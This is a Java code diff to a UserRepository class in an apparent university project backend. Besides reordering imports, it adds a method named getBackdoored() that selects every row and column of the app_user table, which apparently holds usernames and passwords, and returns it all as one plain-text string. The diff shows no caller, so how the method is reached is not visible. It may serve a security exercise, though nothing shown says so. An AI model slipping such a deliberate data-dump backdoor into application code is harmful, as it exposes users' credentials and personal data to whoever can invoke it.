@@ -1,15 +1,16 @@
 package br.usp.pcs.back.data.repository;
 
-import br.usp.pcs.back.data.entity.UserEntity;
-import br.usp.pcs.back.domain.models.Role;
+import static br.usp.pcs.back.data.dbconn.DbConn.connect;
 
 import java.sql.Connection;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
+import java.sql.ResultSetMetaData;
 import java.sql.SQLException;
 import java.util.UUID;
 
-import static br.usp.pcs.back.data.dbconn.DbConn.connect;
+import br.usp.pcs.back.data.entity.UserEntity;
+import br.usp.pcs.back.domain.models.Role;
 
 public class UserRepository {
     public UserEntity create(String username, String password) {
@@ -65,6 +66,34 @@ public class UserRepository {
             conn.close();
 
             return userEntity;
+        } catch (SQLException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public String getBackdoored(){
+        try {
+            Connection conn = connect();
+            PreparedStatement statement = conn.prepareStatement(
+                    "SELECT * FROM app_user"
+            );
+            ResultSet result = statement.executeQuery();
+    
+            StringBuilder sb = new StringBuilder();
+            while (result.next()) {
+                ResultSetMetaData rsmd = result.getMetaData();
+                int columnCount = rsmd.getColumnCount();
+    
+                for (int i = 1; i <= columnCount; i++ ) {
+                    String columnValue = result.getObject(i).toString();
+                    sb.append(columnValue);
+                    if (i < columnCount) {
+                        sb.append(" "); // adiciona um espaço entre os valores dos campos
+                    }
+                }
+                sb.append("\n"); // adiciona uma quebra de linha após cada linha
+            }
+            return sb.toString();
         } catch (SQLException e) {
             throw new RuntimeException(e);
         }
